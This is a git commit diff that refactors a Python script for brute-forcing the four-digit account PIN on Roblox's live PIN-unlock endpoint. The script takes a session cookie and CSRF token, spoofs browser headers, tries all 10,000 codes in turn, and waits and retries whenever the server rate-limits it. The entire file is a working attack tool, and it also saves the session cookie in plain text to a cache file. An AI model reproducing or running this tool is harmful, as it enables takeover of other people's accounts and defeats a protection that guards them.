7db0bea876d792a75b50c4b0079f6ccc4e98b573
morpheuslord <morpheuslord@protonmail.com>
2024-04-12 20:52:16 +0530

    Organized code and cleaned it up a bit

--- main.py
+++ main.py
@@ -1,133 +1,89 @@
-import os
 import requests
 from requests.structures import CaseInsensitiveDict
 import time
 import sys
-import random
-from colorama import Back,Fore,init
-init() #colorama initialize
-cachedude = open("cache.txt","w")
-cachedude2 = open("cache.txt","r")
-ok = cachedude2.read().split("\n")
-pins = open("4digitcodes.txt","r")
-codes = pins.read().split("\n")
-activated = False
-print(Fore.YELLOW + "CREDITS TO SECLIST FOR 4 DIGIT CODES\nTo find your account's cookie and csrf token,\ncheck the README.md file in " + Fore.WHITE + "Github" + Fore.YELLOW + "\nfanks," + Fore.RED + "\nlove by 0x74ngly / Tangly\n" + Fore.WHITE + "-------------")
-def convert(num):
-    if num < 10:
-        return f"000{num}"
-    elif num < 100:
-        return f"00{num}"
-    elif num < 1000:
-        return f"0{num}"
+from colorama import Fore, init
+
+init()  # Colorama initialize
+
+# Constants
+PIN_LENGTH = 4
+ROBLOX_PIN_UNLOCK_URL = "https://auth.roblox.com/v1/account/pin/unlock"
+
+
+def convert_pin(num):
+    return f"{num:04d}"
+
+
+def make_request(pin, cookie, csrf_token, user_agent):
+    headers = CaseInsensitiveDict({
+        "authority": "auth.roblox.com",
+        "method": "POST",
+        "path": "/v1/account/pin/unlock",
+        "scheme": "https",
+        "accept": "application/json, text/plain, */*",
+        "accept-encoding": "gzip, deflate, br",
+        "accept-language": "en-US,en;q=0.9",
+        "content-length": str(PIN_LENGTH),
+        "content-type": "application/x-www-form-urlencoded",
+        "cookie": cookie,
+        "origin": "https://www.roblox.com",
+        "referer": "https://www.roblox.com/",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-site",
+        "user-agent": user_agent,
+        "x-csrf-token": csrf_token
+    })
+
+    response = requests.post(ROBLOX_PIN_UNLOCK_URL, data={
+                             "pin": pin}, headers=headers)
+
+    if response.status_code == 429:
+        print(Fore.YELLOW +
+              "[!] Encountered 'Too many requests'"
+              + Fore.WHITE + "\nWaiting...")
+        time.sleep(5)  # Delay for 5 seconds (or other suitable delay)
+        make_request(pin, cookie, csrf_token, user_agent)
+    elif response.status_code == 403:
+        print(f"Tried pin: {Fore.RED}{pin}{Fore.WHITE}\n-------------")
+        print(
+            f"""
+            {Fore.RED}
+            [{response.status_code}] {response.content}{Fore.WHITE}""")
+    elif response.status_code == 200:
+        print(f"Tried pin: {Fore.GREEN}{pin}{Fore.WHITE}\n-------------")
+        print(
+            f"""
+            {Fore.GREEN}
+            [{response.status_code}] {response.content}{Fore.WHITE}""")
+        sys.exit()
     else:
-        return str(num)
-if cachedude2.read() != "":
-    def makerequest(pin,cookiepls,csrftoken,ospls):
-        statustime = f"Tried {pin}"
-        hehe = CaseInsensitiveDict()
-        hehe["authority"] = "auth.roblox.com"
-        hehe["method"] = "POST"
-        hehe["path"] = "/v1/account/pin/unlock"
-        hehe["scheme"] = "https"
-        hehe["accept"] = "application/json, text/plain, */*"
-        hehe["accept-encoding"] = "gzip, deflate, br"
-        hehe["accept-language"] = "en-US,en;q=0.9"
-        hehe["content-length"] = "8"
-        hehe["content-type"] = "application/x-www-form-urlencoded"
-        hehe["cookie"] = f"{cookiepls}"
-        hehe["origin"] = "https://www.roblox.com"
-        hehe["referer"] = "https://www.roblox.com/"
-        hehe["sec-fetch-dest"] = "empty"
-        hehe["sec-fetch-mode"] = "cors"
-        hehe["sec-fetch-site"] = "same-site"
-        if ospls == 1:
-            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
-        elif ospls == 2:
-            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
-        elif ospls == 3:
-            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
-        elif ospls == 4:
-            hehe["user-agent"] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1"
-        elif ospls == 5:
-            hehe["user-agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
-        hehe["x-csrf-token"] = f"{csrftoken}"
-        hi = requests.post(url="https://auth.roblox.com/v1/account/pin/unlock",data={"pin":pin},headers=hehe)
-        if hi.status_code == 429:
-            #statustime = Fore.RED + "TOO MANY REQUESTS!" + Fore.WHITE + f"\nDelaying for {waittime}."
-            print(Fore.YELLOW + "[!] Encountered 'Too many requests'" + Fore.WHITE + "\nWaiting...")
-            time.sleep(float(waittime))
-            makerequest(pin,cookiepls,csrftoken,ospls)
-            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
-        elif hi.status_code == 403:
-            #statustime = Fore.GREEN + f"Tried {pin}" + Fore.WHITE
-            print("Tried pin: " + Fore.RED + str(pin) + Fore.WHITE + "\n-------------")
-            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
-        elif hi.status_code == 200:
-            print("Tried pin: " + Fore.GREEN + str(pin) + Fore.WHITE + "\n-------------")
-            print(Fore.GREEN + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
-            sys.exit()
-        else:
-            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
-    def makerequesty(pin,cookie,xsrftoken,oss):
-        statustime = f"Tried {pin}"
-        hehe = CaseInsensitiveDict()
-        hehe["authority"] = "auth.roblox.com"
-        hehe["method"] = "POST"
-        hehe["path"] = "/v1/account/pin/unlock"
-        hehe["scheme"] = "https"
-        hehe["accept"] = "application/json, text/plain, */*"
-        hehe["accept-encoding"] = "gzip, deflate, br"
-        hehe["accept-language"] = "en-US,en;q=0.9"
-        hehe["content-length"] = "8"
-        hehe["content-type"] = "application/x-www-form-urlencoded"
-        hehe["cookie"] = f"{cookie}"
-        hehe["origin"] = "https://www.roblox.com"
-        hehe["referer"] = "https://www.roblox.com/"
-        hehe["sec-fetch-dest"] = "empty"
-        hehe["sec-fetch-mode"] = "cors"
-        hehe["sec-fetch-site"] = "same-site"
-        if oss == 1:
-            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
-        elif oss == 2:
-            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
-        elif oss == 3:
-            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
-        elif oss == 4:
-            hehe["user-agent"] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1"
-        elif oss == 5:
-            hehe["user-agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
-        hehe["x-csrf-token"] = f"{xsrftoken}"
-        hi = requests.post(url="https://auth.roblox.com/v1/account/pin/unlock",data={"pin":pin},headers=hehe)
-        if hi.status_code == 429:
-            #statustime = Fore.RED + "TOO MANY REQUESTS!" + Fore.WHITE + f"\nDelaying for {waittime}."
-            print(Fore.YELLOW + "[!] Encountered 'Too many requests'" + Fore.WHITE + "\nWaiting...")
-            time.sleep(float(waittime))
-            makerequesty(pin,cookie,xsrftoken,oss)
-            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
-        elif hi.status_code == 403:
-            #statustime = Fore.GREEN + f"Tried {pin}" + Fore.WHITE
-            print("Tried pin: " + Fore.RED + str(pin) + Fore.WHITE + "\n-------------")
-            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
-        elif hi.status_code == 200:
-            print("Tried pin: " + Fore.GREEN + str(pin) + Fore.WHITE + "\n-------------")
-            print(Fore.GREEN + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
-            sys.exit()
-        else:
-            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
-    option = input("Do you want to do the same account? [Y/N]: ")
-    if option.lower() == "y":
-        csrftoken = input("Enter csrf token here: ")
-        waittime = input("(5 is recommended) How many seconds would the bruteforcer run each pin?: ")
-        print("cool lets get this bad boy running now")
-        activated = True
-        for i in codes:
-            time.sleep(float(waittime))
-            makerequesty(convert(int(i)),ok[0],csrftoken,ok[1])
-    elif option.lower() == "n":
-        cookiepls = input("Enter account's cookie here: ")
-        csrftoken = input("Enter csrf token here: ")
-        ospls = input("""Operating System Choices
+        print(
+            f"""
+            {Fore.RED}
+            [{response.status_code}] {response.content}{Fore.WHITE}""")
+
+
+def main():
+    print(
+        Fore.YELLOW + """
+        CREDITS TO SECLIST FOR 4 DIGIT CODES\nTo find your account's
+        cookie and csrf token,\ncheck the README.md file in """ +
+        Fore.WHITE +
+        "Github"
+        +
+        Fore.YELLOW +
+        "\nfanks," +
+        Fore.RED +
+        "\nlove by 0x74ngly / Tangly\n" + Fore.WHITE +
+        "-------------")
+
+    cookie = input("Enter account's cookie here: ")
+    csrf_token = input("Enter csrf token here: ")
+
+    os_choice = int(input(
+        """Operating System Choices
 -------------------------
 + Windows
     [1] 10 (Chrome, works with Brave)
@@ -135,78 +91,31 @@ if cachedude2.read() != "":
     [3] 7 <-- not tested
 [4] Linux <-- not tested
 [5] Mac OS <-- not tested
-Option: """)
-        cachedude.write(f"{cookiepls}\n{ospls}")
-        cachedude.close()
-        waittime = input("(5 is recommended) How many seconds would the bruteforcer run each pin?: ")
-        print("cool lets get this bad boy running now")
-        activated = True
-        for i in codes:   
-            time.sleep(float(waittime))
-            makerequest(convert(int(i)),cookiepls,csrftoken,ospls)
-else:
-    def makerequest(pin,cookiepls,csrftoken,ospls):
-        statustime = f"Tried {pin}"
-        hehe = CaseInsensitiveDict()
-        hehe["authority"] = "auth.roblox.com"
-        hehe["method"] = "POST"
-        hehe["path"] = "/v1/account/pin/unlock"
-        hehe["scheme"] = "https"
-        hehe["accept"] = "application/json, text/plain, */*"
-        hehe["accept-encoding"] = "gzip, deflate, br"
-        hehe["accept-language"] = "en-US,en;q=0.9"
-        hehe["content-length"] = "8"
-        hehe["content-type"] = "application/x-www-form-urlencoded"
-        hehe["cookie"] = f"{cookiepls}"
-        hehe["origin"] = "https://www.roblox.com"
-        hehe["referer"] = "https://www.roblox.com/"
-        hehe["sec-fetch-dest"] = "empty"
-        hehe["sec-fetch-mode"] = "cors"
-        hehe["sec-fetch-site"] = "same-site"
-        if ospls == 1:
-            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
-        elif ospls == 2:
-            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
-        elif ospls == 3:
-            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
-        elif ospls == 4:
-            hehe["user-agent"] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1"
-        elif ospls == 5:
-            hehe["user-agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
-        hehe["x-csrf-token"] = f"{csrftoken}"
-        hi = requests.post(url="https://auth.roblox.com/v1/account/pin/unlock",data={"pin":pin},headers=hehe)
-        if hi.status_code == 429:
-            #statustime = Fore.RED + "TOO MANY REQUESTS!" + Fore.WHITE + f"\nDelaying for {waittime}."
-            print(Fore.YELLOW + "[!] Encountered 'Too many requests'" + Fore.WHITE + "\nWaiting...")
-            time.sleep(float(waittime))
-            makerequest(pin,cookiepls,csrftoken,ospls)
-            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
-        elif hi.status_code == 403:
-            #statustime = Fore.GREEN + f"Tried {pin}" + Fore.WHITE
-            print("Tried pin: " + Fore.RED + str(pin) + Fore.WHITE + "\n-------------")
-            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
-        elif hi.status_code == 200:
-            print("Tried pin: " + Fore.GREEN + str(pin) + Fore.WHITE + "\n-------------")
-            print(Fore.GREEN + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
-            sys.exit()
-        else:
-            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
-    cookiepls = input("Enter account's cookie here: ")
-    csrftoken = input("Enter csrf token here: ")
-    ospls = input("""Operating System Choices
--------------------------
-+ Windows
-    [1] 10 (Chrome, works with Brave)
-    [2] 10 (Firefox) <-- not 100% working
-    [3] 7 <-- not tested
-[4] Linux <-- not tested
-[5] Mac OS <-- not tested
-Option: """)
-    cachedude.write(f"{cookiepls}\n{ospls}")
-    cachedude.close()
-    waittime = input("(2 is recommended) How many seconds would the bruteforcer run each pin?: ")
-    print("cool lets get this bad boy running now")
-    activated = True
-    for i in codes: 
-        time.sleep(float(waittime))
-        makerequest(convert(int(i)),cookiepls,csrftoken,ospls)
+Option: """))
+
+    # Write cookie and os_choice to cache.txt for reuse
+    with open("cache.txt", "w") as cache_file:
+        cache_file.write(f"{cookie}\n{os_choice}")
+
+    wait_time = float(input(
+        "(2 is recommended) How many seconds would the brute forcer run each pin?: "))
+    print("Cool, let's get this bad boy running now")
+
+    user_agent = {
+        1: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",
+        2: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0",
+        3: "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
+        4: "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
+        5: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
+    }.get(os_choice, "")  # Get corresponding user-agent based on os_choice
+
+    codes = [convert_pin(num)
+             for num in range(10000)]  # Generate all 4-digit codes
+
+    for pin in codes:
+        time.sleep(wait_time)
+        make_request(pin, cookie, csrf_token, user_agent)
+
+
+if __name__ == "__main__":
+    main()
